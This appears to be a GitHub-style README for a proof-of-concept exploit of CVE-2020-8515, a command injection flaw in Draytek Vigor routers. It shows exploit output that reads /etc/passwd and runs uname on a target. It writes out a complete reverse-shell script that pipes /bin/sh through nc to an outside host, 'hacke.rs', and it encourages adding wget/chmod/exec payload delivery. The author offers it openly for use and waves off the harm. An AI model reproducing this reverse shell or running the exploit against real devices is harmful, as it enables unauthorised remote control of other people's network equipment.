# CVE-2020-8515
Draytek CVE-2020-8515 PoC I had kicking about. 

Amusingly, the command injected gets executed twice, see here:

```
$ ./draytek.py draytek.local
(>) executing command: cat /etc/passwd
(+) vulnerable!
(>) executing command: uname -a
Linux Vigor3900 2.6.33.5 #1 Wed Mar 28 00:49:28 CST 2018 armv6l unknown
Linux Vigor3900 2.6.33.5 #1 Wed Mar 28 00:49:28 CST 2018 armv6l unknown
```

I had some plans to polish this one off nicely, but honestly, its like what, a year later and I can't remember what those plans were, so here you go. It isn't hard to add some wget/chmod/exec stuff to this, just look in the "do_stuff" function.

If you wget down and run a script like the following, you do get a reverse shell:
```
#!/bin/sh
HOST="hacke.rs"
PORT=1337
rm -f /tmp/a; mkfifo /tmp/a; nc $HOST $PORT 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a
```

I think you can probably also echoload such a script if you can get around bad chars in the injection, maybe I'll add that later - the double-execution problem really makes that a bit of a chore though. For now, this is kind of half-baked, "user decides". 

This exploit won't cause much harm ITW, all the boxes vulnerable to this have probably been coopted by script kiddies DDoS botnets already.

For scanning: use [the nuclei template someone made](https://github.com/projectdiscovery/nuclei-templates/blob/d174cab04cf29c933585fbf325b44b04f4fa9cde/cves/2020/CVE-2020-8515.yaml)
